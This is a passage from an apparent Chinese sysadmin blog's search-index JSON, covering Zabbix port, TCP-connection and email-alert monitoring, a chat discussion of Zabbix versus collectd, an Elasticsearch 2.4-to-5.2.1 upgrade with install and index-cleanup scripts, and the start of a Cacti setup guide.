zabbix性能监控故障总结","link":"/2014/10/01/性能监控/Zabbix/zabbix的ICMP-Ping模版实现对客户端网络状态的监控/"},{"title":"zabbix监控80端口状态","text":"目的：监控web主机80端口是否在供提服务。如果不在发出报警。zabbix监控web端上面的80端口，或者其他的端口都是可以实现的。 在这里可以添加自带的模板-组态-模板-Template App HTTP Service 有自带的HTTP service is running 服务是否正常启动。 这个是监测http的80端口，后期比如nginx，gitlab,或者其他服务的80端口。可以对单台设置。 也可以创建模板正对性的监控集群的同一个端口。 配置： 1、添加监控项(Items) 12 打开zabbix web管理界面：选择\"Configuration\"-&gt;\"Hosts\"-这里选择需要监控的机器-\"Items\" 选择Create-item 创建项目，这个对这台监控的服务器创建对应的监控项目。 在这里”name”为”web01.haozhuo 80”，设置”key”点击”Select”按钮弹出下图选择”net.tcp.port[,port]”,然后修改为web01的ip地址端口为80。”net.tcp.port[192.168.0.2,80]” 保存 2、添加触发器（Triggers）选择Configuration”-&gt;”Hosts”-这里选择需要监控的机器-“Triggers” 选择Create-Trigger 保存 然后选择添加图形。 zabbix-server2.4服务端编译安装 zabbix-server服务端编译安装 zabbix2.4监控80端口状态 : zabbix监控80端口状态 zabbix+Grafana安装使用监控结合 ：zabbix+Grafana安装使用监控结合 zabbix监控MySQL-添加自定义监控项 : zabbix监控MySQL-添加自定义监控项 zabbix的ICMP_Ping模版实现对客户端网络状态的监控 : zabbix的ICMP_Ping模版实现对客户端网络状态的监控 zabbix性能监控故障总结 zabbix性能监控故障总结","link":"/2014/10/06/性能监控/Zabbix/zabbix监控80端口状态/"},{"title":"zabbix监控tcp连接数","text":"系统环境: CentOS release 6.7 (Final) zabbix.3.0.3 zabbix-server端：首先创建脚本 Shell 12mkdir /usr/local/zabbix/scripts[root@zabbix scripts]# vim /usr/local/zabbix/scripts/tcp_connections.sh script： 1234567891011121314151617181920212223242526272829303132#!/bin/bash stat() &#123; netstat -an | awk '/^tcp/ &#123;++S[$NF]&#125; END &#123;for(a in S) print a, S[a]&#125;' &#125; case $1 in TIME_WAIT) stat |grep 'TIME_WAIT' |awk '&#123;print $2&#125;' ;; CLOSE_WAIT) stat | grep 'CLOSE_WAIT' |awk '&#123;print $2&#125;' ;; FIN_WAIT1) stat | grep 'FIN_WAIT1' |awk '&#123;print $2&#125;' ;; ESTABLISHED) stat | grep 'ESTABLISHED' |awk '&#123;print $2&#125;' ;; SYN_RECV) stat |grep 'SYN_RECV' |awk '&#123;print $2&#125;' ;; LAST_ACK) stat |grep 'LAST_ACK' |awk '&#123;print $2&#125;' ;; LISTEN) stat |grep 'LISTEN' |awk '&#123;print $2&#125;' ;; *) echo \"Usage: TIME_WAIT CLOSE_WAIT FIN_WAIT1 ESTABLISHED SYN_RECV LAST_ACK LISTEN\" ;;esac 测试脚本是否可用 123[root@zabbix scripts]# chmod +x tcp_connections.sh[root@zabbix scripts]# ./tcp_connections.sh ESTABLISHED59 zabbix-agent端：1[root@zabbix scripts]# vim /usr/local/zabbix/etc/zabbix_agentd.conf.d/monitor_tcp_connections.conf 编辑server端zabbix_agentd配置 1234567UserParameter=tcp.time_wait,/usr/local/zabbix/scripts/tcp_connections.sh TIME_WAITUserParameter=tcp.close_wait,/usr/local/zabbix/scripts/tcp_connections.sh CLOSE_WAITUserParameter=tcp.fin_wait1,/usr/local/zabbix/scripts/tcp_connections.sh FIN_WAIT1UserParameter=tcp.established,/usr/local/zabbix/scripts/tcp_connections.sh ESTABLISHEDUserParameter=tcp.syn_recv,/usr/local/zabbix/scripts/tcp_connections.sh SYN_RECVUserParameter=tcp.last_ack,/usr/local/zabbix/scripts/tcp_connections.sh LAST_ACKUserParameter=tcp.listen,/usr/local/zabbix/scripts/tcp_connections.sh LISTEN 重启服务123[root@zabbix scripts]# /etc/init.d/zabbix_agentd restartShutting down zabbix_agentd: [确定]Starting zabbix_agentd: [确定] 测试监控是否有数据12/usr/local/zabbix/bin/zabbix_get -s localhost -k tcp.establishedZBX_NOTSUPPORTED: Unsupported item key. 出现这个错误，提示我key值有问题。所以我检查了下配置。 添加了一条目录。 12vim /usr/local/zabbix/etc/zabbix_agentd.confInclude=/usr/local/zabbix/etc/zabbix_agentd.conf.d/*.conf 然后测试： 12[root@zabbix scripts]# /usr/local/zabbix/bin/zabbix_get -s localhost -k tcp.established64 然后在web里创建模版，方便以后多台添加 选择配置-模板-右上角.创建模板 填写模版名称 创建监控项 可以克隆创建监控项。 创建图形 模版创建完成后，要关联到监控主机 点击主机，选择模版 等一会儿数据图形就会出现 其他机器也是一样直接添加模板即可。在agentd下面添加key键值重启服务就行。 可参考： zabbix监控tcp连接数 zabbix-server2.4服务端编译安装 zabbix-server服务端编译安装 zabbix2.4监控80端口状态 : zabbix监控80端口状态 zabbix+Grafana安装使用监控结合 ：zabbix+Grafana安装使用监控结合 zabbix监控MySQL-添加自定义监控项 : zabbix监控MySQL-添加自定义监控项 zabbix的ICMP_Ping模版实现对客户端网络状态的监控 : zabbix的ICMP_Ping模版实现对客户端网络状态的监控 zabbix性能监控故障总结 zabbix性能监控故障总结","link":"/2016/06/21/性能监控/Zabbix/zabbix监控tcp连接数/"},{"title":"zabbix邮件告警","text":"操作系统环境：CentOS release 6.7 (Final) zabbix版本2.4.7 关于操作系统CentOS6.0 以下版本都是通过mail命令调用sendmail的sm-client发送邮件，所以如果关闭sendmail按照很多网上的文档是发不出邮件的。 centos 6.0以上版本 12默认已经安装好sendmail默认已经安装好postfix sendmail和postfix只需要安装一个即可并开启服务即可。 实现目的：在Zabbix服务端设置邮件报警，当被监控主机宕机或者达到触发器预设值时，会自动发送报警邮件到指定邮箱，定位哪里出现问题，可以及时的解决。 1.安装邮件发送工具mailxCentOS 6.x 编译安装mailx，直接yum安装的mailx版本太旧，使用外部邮件发送会有问题。 123yum install mailx #安装yum remove mailx #卸载系统自带的旧版mailx 这里我用编译安装的很简单几步就可以了。 mail下载地址:Downloads 1234567891011[root@salt ~]# curl -O http://ftp.debian.org/debian/pool/main/h/heirloom-mailx/heirloom-mailx_12.5.orig.tar.gz[root@salt ~]# tar -zxvf heirloom-mailx_12.5.orig.tar.gz [root@salt ~]# cd heirloom-mailx-12.5[root@salt heirloom-mailx-12.5]# make[root@salt heirloom-mailx-12.5]# make install UCBINSTALL=/usr/bin/install[root@salt heirloom-mailx-12.5]# ln -s /usr/local/bin/mailx /bin/mail #创建mailx到mail的软连接[root@salt heirloom-mailx-12.5]# ln -s /etc/nail.rc /etc/mail.rc #创建mailx配置文件软连接[root@salt heirloom-mailx-12.5]# whereis mailx #查看安装路径mailx: /bin/mailx /usr/local/bin/mailx /usr/share/man/man1p/mailx.1p.gz /usr/share/man/man1/mailx.1.gz [root@salt heirloom-mailx-12.5]# mailx -V #查看版本信息12.5 6/20/10 安装完以后我们来测试下： 123456[root@salt]# echo \"zabbix test mail\" |mail -s zabbix\" it@hz-health.cn[root@salt]# send-mail: warning: inet_protocols: IPv6 support is disabled: Address family not supported by protocolsend-mail: warning: inet_protocols: configuring for IPv4 support onlypostdrop: warning: inet_protocols: IPv6 support is disabled: Address family not supported by protocolpostdrop: warning: inet_protocols: configuring for IPv4 support onlypostdrop: warning: unable to look up public/pickup: No such file or directory 如果有出现这个报错，那么我们需要修改下配置文件。查看当前inet_protocols 123456789# /usr/sbin/postconf | grep inet_protocolsinet_protocols = all修改ipv4# vi /etc/postfix/main.cfinet_protocols = all改为inet_protocols = ipv4重启postfixservice postfix restart 然后在测试： 1[root@salt]# echo \"zabbix test mail\" |mail -s \"zabbix\" it@xxxx.cn 测试发送邮件，标题zabbix，邮件内容：zabbix test mail，发送到的邮箱：xxx.qq.com 这时候，邮箱yyy@qq.com会收到来自xxx@qq.com的测试邮件。 2、创建邮件告警的python脚本zabbix_server添加脚本配置: zabbix安装路径：cd /usr/local/zabbix/share/zabbix/alertscripts 编写脚本：vim /usr/local/zabbix/share/zabbix/alertscripts/zabbix_sendmail.py 12345678910111213141516171819202122232425262728#!/usr/bin/env python#coding:utf-8import smtplibfrom email.mime.text import MIMETextimport sysLOG_FILENAME=\"/var/log/email_python.log\"mail_host = 'smtp.exmail.qq.com' #定义smtp服务器mail_user = 'it@xxxx.cn' #发件人邮箱mail_pass = 'xxxxxxx' #发件人邮箱密码mail_port = 465 #smtp服务器的端口号，不同的邮箱服务器端口号不同def send_mail(to_list,subject,content): me=\"Zabbix Monitor\"+\"&lt;\"+mail_user+\"&gt;\" #定义发件人显示名称为Zabbix Monitor msg=MIMEText(content,_subtype='plain',_charset='gb2312') msg['Subject']=subject #定义邮件主题 msg['From']=me #发送方 msg['to']=to_list #接收方 try: s=smtplib.SMTP_SSL() #创建一个smtp对象 s.connect(mail_host,mail_port) #通过connect方法连接smtp主机 s.login(mail_user,mail_pass) #邮箱账户登录认证 s.sendmail(me,to_list,msg.as_string()) #发送邮件 s.close() #断开smtp连接 return True except Exception,e: print str(e) return Falseif __name__ == \"__main__\": send_mail(sys.argv[1],sys.argv[2],sys.argv[3]) 2、脚本文件路径 先确认下zabbix_server.conf文件中定义的告警脚本路径配置： 如果注释了，添加一条绝对路径。 12# AlertScriptsPath=$&#123;datadir&#125;/zabbix/alertscripts AlertScriptsPath=/usr/local/zabbix/share/zabbix/alertscripts 然后将准备好的python脚本存放到该路径下，并更改脚本文件的权限和属主属组 12chown zabbix.zabbix /usr/local/zabbix/share/zabbix/alertscripts/zabbix_sendmail.pychmod +x /usr/local/zabbix/share/zabbix/alertscripts/zabbix_sendmail.py 注意：如果在zabbix_server.conf文件中没有设置Allow root=1，则表示zabbix是以zabbix用户启动而不是root，所以脚本的属主属组都应该设置为zabbix用户。设置为root用户启动的配置如下。 123456789### Option: AllowRoot# Allow the server to run as 'root'. If disabled and the server is started by 'root', the server# will try to switch to user 'zabbix' instead. Has no effect if started under a regular user.# 0 - do not allow# 1 - allow## Mandatory: no# Default:AllowRoot=1 重启服务： 123[root@salt alertscripts]# /etc/init.d/zabbix_server restartShutting down zabbix_server: [确定]Starting zabbix_server: [确定] 3、测试脚本文件发送邮件是否成功，这一步很重要 1./zabbix_sendmail.py cheng@health.cn \"subject\" \"zabbix\" 已经测试ok，可以收到邮件，说明写的python脚本没有问题。 zabbix-web端设置 首先web端的配置顺序如下：创建用户媒介–&gt;创建用户组和用户–&gt;针对trigger（触发器）添加报警动作，设置邮件发送用户及媒介 1.创建用户媒介 创建用户媒介–&gt;创建用户组和用户–&gt;Media types–&gt;Createmediatype Mediatype设置如下， Name项自定义（创建用户时会用到这个名字),我们使用脚本来发邮件，所以Type项请选择Script，Script项则是你zabbix server上的发送邮件的脚本名字 （注：如脚本名字是snedmail.py,那此项就填sendmail，后缀不要) zabbix会传给脚本三个参数：接收用户，邮件主题，邮件内容 2.设置Zabbix用户报警邮箱地址 组态-用户-Admin (Zabbix Administrator) 再到Media标签下，点击Add添加用户及该用户的报警方式，然后Type项选择你所创建的邮件报警名字（Media Type），在Send to后填入用户的报警邮箱，其他默认即可。 3.设置Zabbix触发报警的动作 组态-动作-创建动作 123456789101112131415161718192021222324252627282930313233343536373839404142434445名称：Action-Email默认接收人：故障&#123;TRIGGER.STATUS&#125;,服务器:&#123;HOSTNAME1&#125;发生: &#123;TRIGGER.NAME&#125;故障!默认信息：告警主机:&#123;HOSTNAME1&#125;告警时间:&#123;EVENT.DATE&#125; &#123;EVENT.TIME&#125;告警等级:&#123;TRIGGER.SEVERITY&#125;告警信息: &#123;TRIGGER.NAME&#125;告警项目:&#123;TRIGGER.KEY1&#125;问题详情:&#123;ITEM.NAME&#125;:&#123;ITEM.VALUE&#125;当前状态:&#123;TRIGGER.STATUS&#125;:&#123;ITEM.VALUE1&#125;事件ID:&#123;EVENT.ID&#125;恢复信息：打钩恢复主旨：恢复&#123;TRIGGER.STATUS&#125;, 服务器:&#123;HOSTNAME1&#125;: &#123;TRIGGER.NAME&#125;已恢复!恢复信息：告警主机:&#123;HOSTNAME1&#125;告警时间:&#123;EVENT.DATE&#125; &#123;EVENT.TIME&#125;告警等级:&#123;TRIGGER.SEVERITY&#125;告警信息: &#123;TRIGGER.NAME&#125;告警项目:&#123;TRIGGER.KEY1&#125;问题详情:&#123;ITEM.NAME&#125;:&#123;ITEM.VALUE&#125;当前状态:&#123;TRIGGER.STATUS&#125;:&#123;ITEM.VALUE1&#125;事件ID:&#123;EVENT.ID&#125;已启用：打钩 创建Operations 到这里就基本配置完毕了。 测试下关闭agent 1分钟左右可以收到邮件。 关闭防火墙和selinux 即可，不关闭防火墙开启10051端口和10050端口 测试查看zabbix审计动态日志：发送成功 邮件已接收成功。 微信告警也已写详细文档。文档file已上传github上面了。 zabbix-server2.4服务端编译安装 zabbix-server服务端编译安装 zabbix2.4监控80端口状态 : zabbix监控80端口状态 zabbix+Grafana安装使用监控结合 ：zabbix+Grafana安装使用监控结合 zabbix监控MySQL-添加自定义监控项 : zabbix监控MySQL-添加自定义监控项 zabbix的ICMP_Ping模版实现对客户端网络状态的监控 : zabbix的ICMP_Ping模版实现对客户端网络状态的监控 zabbix性能监控故障总结 zabbix性能监控故障总结","link":"/2014/10/05/性能监控/Zabbix/zabbix邮件告警/"},{"title":"直播分享的主题是云监控----zabbix&collectd 互相讨论","text":"直播分享的主题是云监控—-zabbix&amp;collectd 互相讨论前几天参加KVM开展的直播秀，肖总请来了各位运维大咖给我们展示他们云监控。这里我整理下崔广章大师的聊天记录各位可以一起聆听下。 12345678910111213141516171819202122232425 崔广章 19:58我之前一直在做私有云，我们整个云平台的监控系统系统用的就是zabbix 崔广章 19:59基本没什么变化，做的比较多的就是国际化，大家都懂的 崔广章 20:00我先借度娘给搭建扫个盲 崔广章 20:00zabbix（音同 zæbix）是一个基于WEB界面的提供分布式系统监视以及网络监视功能的企业级的开源解决方案。 崔广章 20:01zabbix能监视各种网络参数，保证服务器系统的安全运营；并提供灵活的通知机制以让系统管理员快速定位/解决存在的各种问题。 崔广章 20:02zabbix由2部分构成，zabbix server与可选组件zabbix agent。 崔广章 20:02zabbix server可以通过SNMP，zabbix agent，ping，端口监视等方法提供对远程服务器/网络状态的监视，数据收集等功能，它可以运行在Linux，Solaris，HP-UX，AIX，Free BSD，Open BSD，OS X等平台上。 崔广章 20:02扫盲就到此为止吧 崔广章 20:03按度娘的，接下来就是安装啦，我就在这耽误大家的人间啦 崔广章 20:04zabbix监控主要分四块，zabbix-agent,SNMP,IPMI,和JMX 崔广章 20:05因为我们主要是是做Iaas和Pass的，所以我们只用了前三种功能 崔广章 20:06前三种功能又分为两种方案，就是负载大时的一种方案和负载小时的方案 崔广章 20:07 12345 崔广章 20:07这是小负载时的方案 崔广章 20:08接下来是大负载时的方案 崔广章 20:08 12崔广章 20:11这里还有一个zabbix的整体架构广章 20:11 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136 崔广章 20:12我从14年才开始将zabbix进行分布式部署 崔广章 20:14在云环境下，zabbix有个缺点就是，对虚拟机的监控达我们感觉不理想 崔广章 20:15因为zabbix对与虚拟与物理机进行监控采取的是同样的方法，就是向系统中注入代理zabbix-agent 崔广章 20:15对诸如代理我有两点担心 崔广章 20:17一、因为zabbix-agent它本身也占用了资源，对于自己占用的资源它能不能准确监控，这我还不能确定，如果它不能对自己占用的资源进行准确监控，那就等于污染了虚拟机 崔广章 20:19二，zabbix-agent是打包在云主机的镜像中的一个cron任务，说白他就是云主机的一个普通进程，如果用户把它给kill了，是不是就监控不到啦？ 崔广章 20:21所以我就找能运行在底层又能对虚拟机进行准确检测的工具 崔广章 20:21那就是接下来要说的collectd喽 崔广章 20:21老规矩，咱们还接着扫盲 崔广章 20:21collectd是一个守护(daemon)进程，用来收集系统性能和提供各种存储方式来存储不同值的机制。比如以RRD 文件形式。 崔广章 20:29collectd确实能够运行在底层，并能采集KVM虚拟机的各项数据，但他的展示使用CGP跟zabbix比太差 崔广章 20:31我所以我就试着将两者进行优势互补 崔广章 20:32我是将collectd存储在*.rrd中的相关数据取出来，然后存储到zabbix的数据库当中，让zabbix进行展示 崔广章 20:33其实只是将collectd采集的虚拟机的内存的数据进行转存和展示 崔广章 20:36整个过程包括，分析zabbix的数据库表之间的关系，研究怎么从collectd的*.rrd文件中取数据怎么将取出的数据向数据库里保存，这是一项很大的工程 崔广章 20:36今天就分享到这吧好吧？ 侯燚@贵州高新翼云 20:37谢谢 崔广章 20:37 袁进坤|南京|云应用+大数据+云计算 20:37 薛群 20:37其实你说的第一个问题，不是问题 北极熊 20:37大家开始提问吧 薛群 20:38只要是监控，都需要消耗少量资源 崔广章 20:38这个问题我也请教过肖哥@薛群 刘海宾 20:38通过libvirt也能获取虚拟机的内存 崔广章 20:38嗯嗯 薛群 20:38不属于污染虚拟机哦 崔广章 20:38嗯嗯 薛群 20:39腾讯云上的虚拟机十几个agent 崔广章 20:39collectd就是调用了libvirt 崔广章 20:39@薛 崔广章 20:40错啦 袁进坤|南京|云应用+大数据+云计算 20:40在选择监控工具的时候，是否考虑过其他类似的工具，例如nagios，做出选择的主要考虑是什么？ 薛群 20:40第二种方式，消耗资源多不？ 刘海宾 20:40那collected就干这一件事吗 崔广章 20:40 刘海宾 20:40其实虚拟机监控可以用qga 刘海宾 20:41走channel 薛群 20:41nagios功能没有ZBX强，性能也不及 崔广章 20:41collectd目前我只让它干了怎么一件事 刘海宾 20:42那自己写个脚本更简单吧 呵呵 只是个人观点 崔广章 20:42我也试着写了一套脚本 刘海宾 20:43@薛群 私有云跑agent还好 公有云 用户很反感 薛群 20:43@袁进坤@南京，云计算 其实监控主要考虑：方便，扩展性好(规模和二次开发)，功能全， 崔广章 20:43但数据误差太大 崔广章 20:44就是考虑到这一点@刘海宾@新网 刘海宾 20:45虚拟机加上ballon 薛群 20:46嗯，是的。腾讯云上这么多agent，是不爽 崔广章 20:46ballon跟内存监控关系不大@刘海宾@新网 于江磊@奇点时代 20:47zabbix再多个配置不同的vm时，请问模板是分别定制的么 崔广章 20:48对的 于江磊@奇点时代 20:48监控多个 刘海宾 20:49libguestfs也能干这事 袁进坤|南京|云应用+大数据+云计算 20:50@薛群 @崔广章 谢谢 刘海宾 20:50青云的监控走的channel在 init里边起了个进程 不容易杀死 还不错 刘海宾 20:51@崔广章 谢谢分享 崔广章 20:51@袁进坤@南京，云计算 崔广章 20:51 袁进坤|南京|云应用+大数据+云计算 20:52@崔广章 主要监控了哪些指标？如果在openstack架构，ceilometer和zabbix的的关系怎么看？ 刘浩 20:52我求问个问题：把zabbix agent用supervise起。是不是就不用担心被杀死的问题了。 于江磊@奇点时代 20:53我在用zabbix时,遇到一个问题,监控主机网卡的时候,zabbix默认采用了auto_discovery的策略,但是我宿主机上跑了很多个容器,容器的网络运行模式为桥接,此时zabbix就会自动去检测那些veth的设备,请问我该如何配置呢? 达到让zabbix只监控em0 或者eth0的网卡设备呢 崔广章 20:54ceilometer其实是openstack自带的功能，但是功能很菜@袁进坤@南京，云计算 崔广章 20:54@刘浩@360 其实我就是怎想的 年福瑞@小牛资本 20:57@于江磊@奇点时代 自己写脚本，取物理别名 崔广章 20:58我也遇到这样的问题@于江磊@奇点时代 刘浩 20:59@崔广章 那是不是可以不用collected了 崔广章 21:00理论上是可以，但数据转存的时候，工作量很大@刘浩@360 崔广章 21:01难点主要在zabbix端，关系错综复杂 薛群 21:01@于江磊@奇点时代 用正则表达式过滤 薛群 21:03公有云起agent确实是个问题 崔广章 21:03这是公有云的痛点 转载：kvm论坛 就整理这些，想说现在监控也越来越完善了，可以做到邮件告警，微信告警，钉钉告警短信电话告警。 万能的监控zabbix只要有key值都可以做到任何监控。 也还有些公司对监控更加要求性高可以针对性技术开发一套监控大屏，记得在之前公司运维CDN就是整个技术团队研发一套监控大盘的，主要监控流量的状态每个节点的流量带宽。 有兴趣一起研究监控的可以加我QQ:1165958741 或者加入群一起讨论：459096184","link":"/2016/08/21/性能监控/Zabbix/直播分享的主题是云监控----zabbix&collectd 互相讨论/"},{"title":"ELK架构梳理-之ES2.4双实例平滑升级至5.2.1踩坑并supervisor管理笔记","text":"ELK架构梳理：实时日志分析作为掌握业务情况、故障分析排查的一个重要手段，目前使用最多最成熟的莫过于ELK方案，整体方案也有各种架构组合，像rsyslog-&gt;ES-&gt;kibana、rsyslog-&gt;Redis-&gt;Logstash-&gt;ES-&gt;kibana、rsyslog-&gt;kafka-&gt;Logstash-&gt;ES-&gt;kibana等等，复杂点的有spark的引用。 每种方案适合不同的应用场景，没有优劣之分，我目前用的是rsyslog-&gt;kafka-&gt;Logstash-&gt;ES-&gt;kibana和rsyslog-&gt;rsyslog中继-&gt;kafka-&gt;Logstash-&gt;ES-&gt;kibana方案，共5台ES（12核、64G、机械盘）每天索引10多亿条日志，包含nginx、uwsgi、redis、php开发日志等，运行比较健壮，每条索引日志精简后在10个字段左右，每天Primary Shard的索引量大概在600个G，考虑到性能问题，我们没要复制分片，同时着重做了ES集群的调优，日志保留7天。 从整体架构进行抽象总结，其实就是采集-&gt;清洗-&gt;索引-&gt;展现四个环节，再去考虑各环节中缓存、队列的使用，每个环节点用不同的软件来实现。下面介绍一下我目前方案集群的搭建和配置。 ES集群方案平滑：ES老集群用的2.4.1版本，跑的比较好就一直没动，最近看资料ES5.X已经稳定，并且性能有较大提升，心里就发痒了，但由于业务要保持高可用的属性，就得想一个平滑升级的方案，最后想到了多实例过度的办法，5.X版本网上介绍配置变化较大，也做好了踩坑准备，确定好要升级后，立刻动手。 一、对应升级改造方案 12341. 使用端口9220和9330 安装并配置好新的ES5.2.1实例2. 关掉logstash并将ES2.4.1实例堆栈调小重启（kafka保留3个小时日志所以不会丢失3. 启动ES5.2.1并将logstash开启指向ES5.2.14. 安装新版kibana实例做好指向，老数据用http://host/old访问——&gt;ES5.2.1配置调优。 二、升级后统一用supervisord-monitor管理三、周末跑了一天ES的cpu、IO、heap内存使用率，es磁盘情况，集群健康监测和thread_pool的监控数据（需要了解的添加QQ群）四、升级过程——编写了ES5.2.1的安装脚本如下 集群脚本化部署：之前用的rpm包，后考虑直接使用tar包安装，对于需要系统做的调优操作，直接编写自动化安装脚本，一键将所有系统参数配置后，将环境搭建好。 12345678910111213141516#/bin/shid elasticsearch || useradd elasticsearch -s /sbin/nologin #添加用户grep \"* - nofile 512000\" /etc/security/limits.conf || echo \"* - nofile 512000\" &gt;&gt; /etc/security/limits.conf #修改文件描述符数量grep \"elasticsearch - nproc unlimited\" /etc/security/limits.conf || echo \"elasticsearch - nproc unlimited\" &gt;&gt; /etc/security/limits.conf #修改最大打开进程数数量grep \"fs.file-max = 1024000\" /etc/sysctl.conf || echo \"fs.file-max = 1024000\" &gt;&gt; /etc/sysctl.conf #修改系统文件描述符grep \"vm.max_map_count = 262144\" /etc/sysctl.conf || echo \"vm.max_map_count = 262144\" &gt;&gt; /etc/sysctl.conf #修改程序最大管理的vmsysctl -pcd /usr/local/src[ ! -f /usr/local/src/elasticsearch-5.2.1.zip ] &amp;&amp; wget https://artifacts.elastic.co/dow ... ticsearch-5.2.1.zip[ ! -d /usr/local/src/elasticsearch-5.2.1 ] &amp;&amp; unzip elasticsearch-5.2.1.zipmv elasticsearch-5.2.1 /usr/local/chown -R elasticsearch:elasticsearch /usr/local/elasticsearch-5.2.1 #修改拥有者所有组sed -i 's/-XX:+UseConcMarkSweepGC/-XX:+UseG1GC/' /usr/local/elasticsearch-5.2.1/config/jvm.options #GC方式修改为G1sed -i 's/-XX:CMSInitiatingOccupancyFraction=75/-XX:MaxGCPauseMillis=200/' /usr/local/elasticsearch-5.2.1/config/jvm.optionssed -i 's/-XX:+UseCMSInitiatingOccupancyOnly/#-XX:+UseCMSInitiatingOccupancyOnly/' /usr/local/elasticsearch-5.2.1/config/jvm.options 五、升级过程——配置文件、索引相关的更新调优 升级期间着实踩了不少坑，老版ES索引配置可以直接写到配置文件里，新版是不行的，必须使用api去设置，另外ES2.X版本的进程数调优，在ES5.X我发现调整与否没有影响。配置文件如下： 123456789101112cluster.name: yz-5searchpath.data: /data1/LogData5/path.logs: /data1/LogData5/logsbootstrap.memory_lock: false #centos6内核不支持，必须要关闭bootstrap.system_call_filter: falsenetwork.host: 10.39.40.94http.port: 9220transport.tcp.port: 9330discovery.zen.ping.unicast.hosts: [\"10.39.40.94:9330\",\"10.39.40.95:9330\",\"10.39.40.96:9330\",\"10.39.40.97:9330\"]discovery.zen.minimum_master_nodes: 2http.cors.enabled: truehttp.cors.allow-origin: \"*\" 为了加快索引效率，编写index的模板配置（index配置不允许写到配置文件了），将参数put到es的里，当然模板也可以通过前端logstash指定（要改logtash觉得麻烦），template脚本如下： 12345678910111213141516#/bin/sh#index templatecurl -XPUT 'http://10.39.40.94:9220/_template/cms_logs?pretty' -d '&#123; \"order\": 6, #优先级 \"template\": \"logstash-cms*\", #正则匹配索引 \"settings\": &#123; \"index.refresh_interval\" : \"60s\", #索引刷新时间 \"index.number_of_replicas\" : \"0\", #副本数设置为0 \"index.number_of_shards\" : \"8\", #分片数设置为8，共4台服务器 \"index.translog.flush_threshold_size\" : \"768m\", #translog触发flush的阀值 \"index.store.throttle.max_bytes_per_sec\" : \"500m\", #存储的阀值 \"index.translog.durability\": \"async\", #设置translog异步刷新到硬盘，更注重性能 \"index.merge.scheduler.max_thread_count\": \"1\", #机械盘设置为1 \"index.routing.allocation.total_shards_per_node\": \"2\" #每个节点上两个分片 &#125;&#125;' 备：如果是更改，将PUT改为POST 日志保留7天，清除的脚本如下，写入计划任务： 1234#!/bin/bashDATE=`date +%Y.%m.%d.%I`DATA2=`date +%Y.%m.%d -d'-7 day'`curl -XDELETE \"http://10.39.40.97:9220/logstash-*-$&#123;DATA2&#125;*?pretty\" 由于单个索引达到了35G甚至40G以上，于是在logstash层面对建索引数量进行修改，把每天12个索引修改为每天24个索引： logstash的修改如下： 12index =&gt; \"logstash-cms-front-nginx-%&#123;+YYYY.MM.dd.hh&#125;\" 修改为index =&gt; \"logstash-cms-front-nginx-%&#123;+YYYY.MM.dd.HH&#125;\" *更新自动化搭建es集群，架构梳理详解-与实现es监控服务 参考： Logstash分享,online生产环境的使用,online日志规范。 ☺待整理续写~~ Communicative learning:🐧 Linux shell_ senior operation and maintenance faction: QQ group 459096184 circle (system operation and maintenance - application operation and maintenance - automation operation and maintenance - virtualization technology research, welcome to join)🐧 BigData-Exchange School:QQ group 521621407 circles (big data Yun Wei) (Hadoop developer) (big data research enthusiasts) welcome to join Bidata have internal WeChat exchange group, learn from each other, join QQ group has links.","link":"/2017/09/14/日志分析\u0010平台/Elasticsearch/ELK架构梳理-之ES 2.4双实例平滑升级至5.2.1踩坑并supervisor管理笔记/"},{"title":"了解Cacti监控安装与配置.md","text":"什么是Cacti?Cacti， 在英文中的意思是仙人掌的意思，Cacti是一套基于PHP,MySQL,SNMP及RRDTool开发的网络流量监测图形分析工具。它通过snmpget来获取数据，使用 RRDtool绘画图形，而且你完全可以不需要了解RRDtool复杂的参数。它提供了非常强大的数据和用户管理功能，可以指定每一个用户能查看树状结构、host以及任何一张图，还可以与LDAP结合进行用户验证，同时也能自己增加模板，功能非常强大完善。Cacti 的发展是基于让 RRDTool 使用者更方便使用该软件，除了基本的 Snmp 流量跟系统资讯监控外，Cacti 也可外挂 Scripts 及加上 Templates 来作出各式各样的监控图。 Cacti是用php语言实现的一个软件，它的主要功能是用snmp服务获取数据，然后用rrdtool储存和更新数据，当用户需要查看数据的时候用rrdtool生成图表呈现给用户。因此，snmp和rrdtool是cacti的关键。Snmp关系着数据的收集，rrdtool关系着数据存储和图表的生成。 Mysql配合PHP程序存储一些变量数据并对变量数据进行调用，如：主机名、主机ip、snmp团体名、端口号、模板信息等变量。 snmp抓到数据不是存储在mysql中，而是存在rrdtool生成的rrd文件中（在cacti根目录的rra文件夹下）。rrdtool对数据的更新和存储就是对rrd文件的处理，rrd文件是大小固定的档案文件（Round Robin Archive），它能够存储的数据笔数在创建时就已经定义。关于RRDTool的知识请参阅RRDTool教学。 什么是SNMP？snmp(Simple Network Management Protocal, 简单网络管理协议)在架构体系的监控子系统中将扮演重要角色。大体上，其基本原理是，在每一个被监控的主机或节点上 (如交换机)都运行了一个 agent，用来收集这个节点的所有相关的信息，同时监听 snmp 的 port，也就是 UDP 161，并从这个端口接收来自监控主机的指令(查询和设置)。 如果安装 net-snmp，被监控主机需要安装 net-snmp(包含了 snmpd 这个 agent)，而监控端需要安装 net-snmp-utils，若接受被监控端通过trap-communicate发来的信息的话，则需要安装net-snmp，并启用trap服务。如果自行编译，需要 beecrypt(libbeecrypt)和 elf(libraryelf)的库。 什么是RRDtools？RRDtool是指Round Robin Database 工具（环状数据库）。Round robin是一种处理定量数据、以及当前元素指针的技术。想象一个周边标有点的圆环－－这些点就是时间存储的位置。从圆心画一条到圆周的某个点的箭头－－这就是指针。就像我们在一个圆环上一样，没有起点和终点，你可以一直往下走下去。过来一段时间，所有可用的位置都会被用过，该循环过程会自动重用原来的位置。这样，数据集不会增大，并且不需要维护。RRDtool处理RRD数据库。它用向RRD数据库存储数据、从RRD数据库中提取数据。 Cacti是基于nginx，rrdtool，mysql，php，snmp来运行的. 1.安装操作系统centos6.0以上版本 2.配置好网络IP和DNS 3.修改系统时区和时间，使用上海时区 备份原有的时区文件 1cp /etc/localtime /etc/localtime.bak 用上海时区文件替换系统时区文件 1cp /usr/share/zoneinfo/Asia/Shanghai /etc/localtime 修改/etc/sysconfig/clock文件，修改为： 123ZONE=\"Asia/Shanghai\"UTC=falseARC=false 同步时间 1ntpdate time.nist.gov 4.安装epel源 1rpm -Uvh http://mirrors.sohu.com/fedora-epel/6/x86_64/epel-release-6-8.noarch.rpm 5.安装基础支持软件 1yum install -y openssh-clients telnet wget nginx 